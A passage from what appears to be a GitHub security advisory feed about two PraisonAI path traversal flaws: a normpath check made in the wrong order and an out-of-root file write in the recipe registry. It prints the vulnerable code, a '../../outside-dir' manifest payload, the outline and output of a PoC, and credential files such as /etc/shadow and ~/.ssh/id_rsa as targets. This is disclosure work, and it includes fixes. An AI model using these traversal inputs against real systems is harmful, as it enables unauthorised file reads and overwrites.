<pre><code class="language-python"># Current vulnerable code:
normalized = os.path.normpath(filepath)  # Collapses .. HERE
absolute = os.path.abspath(normalized)
if '..' in normalized:  # Check AFTER collapse - ALWAYS FALSE!
    raise ValueError(...)
</code></pre>
<h3 id="impact">Impact:</h3>
<ul>
<li><strong>Complete bypass</strong> of path traversal protection</li>
<li>Access to ANY file on the system with path from any starting directory</li>
<li>Read sensitive files: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>~/.ssh/id_rsa</code></li>
<li>Write arbitrary files if combined with write operations</li>
<li>Affect file operations <code>read_file</code>, <code>write_file</code>, <code>list_files</code>, <code>get_file_info</code>, <code>copy_file</code>, <code>move_file</code>, <code>delete_file</code>, <code>download_file</code></li>
</ul>
<h3 id="additional-notes">Additional Notes:</h3>
<ul>
<li><strong>Fix:</strong> Check for <code>'..' in filepath</code> BEFORE calling <code>normpath()</code>, not after</li>
<li><code>_validate_path</code> uses <code>os.path.normpath</code> and <code>os.path.abspath</code>, which don't resolve symlinks, making it vulnerable to path traversal via symlink if attacker can control the symlink.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-693f-pf34-72c5">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-693f-pf34-72c5</a></li>
<li><a href="https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113">https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35615">https://nvd.nist.gov/vuln/detail/CVE-2026-35615</a></li>
<li><a href="https://github.com/advisories/GHSA-693f-pf34-72c5">https://github.com/advisories/GHSA-693f-pf34-72c5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-693f-pf34-72c5</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-06T23:09:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PraisonAI] PraisonAI recipe registry publish path traversal allows out-of-root file write]]></title>
        <id>https://github.com/advisories/GHSA-r9x3-wx45-2v7f</id>
        <link href="https://github.com/advisories/GHSA-r9x3-wx45-2v7f"/>
        <updated>2026-04-07T22:10:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>PraisonAI's recipe registry publish endpoint writes uploaded recipe bundles to a filesystem path derived from the bundle's internal <code>manifest.json</code> before it verifies that the manifest <code>name</code> and <code>version</code> match the HTTP route. A malicious publisher can place <code>../</code> traversal sequences in the bundle manifest and cause the registry server to create files outside the configured registry root even though the request is ultimately rejected with HTTP <code>400</code>.</p>
<p>This is an arbitrary file write / path traversal issue on the registry host. It affects deployments that expose the recipe registry publish flow. If the registry is intentionally run without a token, any network client that can reach the service can trigger it. If a token is configured, any user with publish access can still exploit it.</p>
<h3 id="details">Details</h3>
<p>The bug is caused by the order of operations between the HTTP handler and the registry storage layer.</p>
<ol>
<li><code>RegistryServer._handle_publish()</code> in <code>src/praisonai/praisonai/recipe/server.py:370-426</code> parses <code>POST /v1/recipes/{name}/{version}</code>, writes the uploaded <code>.praison</code> file to a temporary path, and immediately calls:</li>
</ol>
<pre><code class="language-python">result = self.registry.publish(tmp_path, force=force)
</code></pre>
<ol start="2">
<li><code>LocalRegistry.publish()</code> in <code>src/praisonai/praisonai/recipe/registry.py:214-287</code> opens the uploaded tarball, reads <code>manifest.json</code>, and trusts the attacker-controlled <code>name</code> and <code>version</code> fields:</li>
</ol>
<pre><code class="language-python">name = manifest.get("name")
version = manifest.get("version")
recipe_dir = self.recipes_path / name / version
recipe_dir.mkdir(parents=True, exist_ok=True)
bundle_name = f"{name}-{version}.praison"
dest_path = recipe_dir / bundle_name
shutil.copy2(bundle_path, dest_path)
</code></pre>
<ol start="3">
<li>Validation helpers already exist in the same file:</li>
</ol>
<pre><code class="language-python">def _validate_name(name: str) -&gt; bool:
def _validate_version(version: str) -&gt; bool:
</code></pre>
<p>but they are not called before the filesystem write.</p>
<ol start="4">
<li>Only after <code>publish()</code> returns does the route compare the manifest values with the URL values:</li>
</ol>
<pre><code class="language-python">if result["name"] != name or result["version"] != version:
    self.registry.delete(result["name"], result["version"])
    return self._error_response(...)
</code></pre>
<p>At that point the out-of-root artifact has already been created. The request returns an error, but the write outside the registry root remains on disk.</p>
<p>Verified vulnerable behavior:</p>
<ul>
<li>Request path: <code>/v1/recipes/safe/1.0.0</code></li>
<li>Internal manifest name: <code>../../outside-dir</code></li>
<li>Server response: HTTP <code>400</code></li>
<li>Leftover artifact: <code>/tmp/praisonai-publish-traversal-poc/outside-dir-1.0.0.praison</code></li>
</ul>
<p>This demonstrates that the write occurs before the consistency check and rollback.</p>
<h3 id="poc">PoC</h3>
<p>Run the single verification script from the checked-out repository:</p>
<pre><code class="language-bash">cd "/Users/r1zzg0d/Documents/CVE hunting/targets/PraisonAI"
python3 tmp/pocs/poc.py
</code></pre>
<p>Expected vulnerable output:</p>
<pre><code class="language-text">[+] Publish response status: 400
{
  "ok": false,
  "error": "Bundle name/version (../../outside-dir@1.0.0) doesn't match URL (safe@1.0.0)",
  "code": "error"
}
[+] Leftover artifact exists: True
[+] Artifact under registry root: False
[+] RESULT: VULNERABLE - upload was rejected, but an out-of-root artifact was still created.
</code></pre>
<p>Then verify the artifact manually:</p>
<pre><code class="language-bash">ls -l /tmp/praisonai-publish-traversal-poc/outside-dir-1.0.0.praison
find /tmp/praisonai-publish-traversal-poc -maxdepth 2 | sort
</code></pre>
<p>What the script does internally:</p>
<ol>
<li>Starts a local PraisonAI recipe registry server.</li>
<li>Builds a malicious <code>.praison</code> bundle whose internal <code>manifest.json</code> contains <code>name = ../../outside-dir</code>.</li>
<li>Uploads that bundle to the apparently safe route <code>/v1/recipes/safe/1.0.0</code>.</li>
<li>Receives the expected <code>400</code> mismatch error.</li>
<li>Confirms that <code>outside-dir-1.0.0.praison</code> was still written outside the configured registry directory.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This is a path traversal / arbitrary file write vulnerability in the recipe registry publish flow.</p>
<p>Impacted parties:</p>
<ul>
<li>Registry operators running the PraisonAI recipe registry service.</li>
<li>Any deployment that allows remote recipe publication.</li>
<li>Any environment where adjacent writable filesystem locations contain sensitive application data, service files, or staged content that could be overwritten or planted.</li>
</ul>
<p>Security impact:</p>
<ul>
<li>Integrity impact is high because an attacker can create or overwrite files outside the registry root.</li>
<li>Availability impact is possible if the attacker targets adjacent runtime or application files.</li>
<li>The issue can be chained with other local loading or deployment behaviors if nearby files are later consumed by another component.</li>
</ul>
<h3 id="remediation">Remediation</h3>
<ol>
<li><p>Validate <code>manifest.json</code> <code>name</code> and <code>version</code> before any path join or filesystem write. Reject path separators, <code>..</code>, absolute paths, and any value that fails the existing <code>_validate_name()</code> / <code>_validate_version()</code> checks.</p>
</li>
<li><p>Resolve the final destination path and enforce that it remains under the configured registry root before calling <code>mkdir()</code> or <code>copy2()</code>. For example, compare the resolved destination against <code>self.recipes_path.resolve()</code>.</p>
</li>
<li><p>Move the URL-to-manifest consistency check ahead of <code>self.registry.publish(...)</code>, or refactor <code>publish()</code> so it receives already-validated route parameters instead of trusting attacker-controlled manifest values for storage paths.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-r9x3-wx45-2v7f">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-r9x3-wx45-2v7f</a></li>
<li><a href="https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113">https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39308">https://nvd.nist.gov/vuln/detail/CVE-2026-39308</a></li>
<li><a href="https://github.com/advisories/GHSA-r9x3-wx45-2v7f">https://github.com/advisories/GHSA-r9x3-wx45-2v7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9x3-wx45-2v7f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-06T23:09:19.000Z</published>
    </entry>
</feed>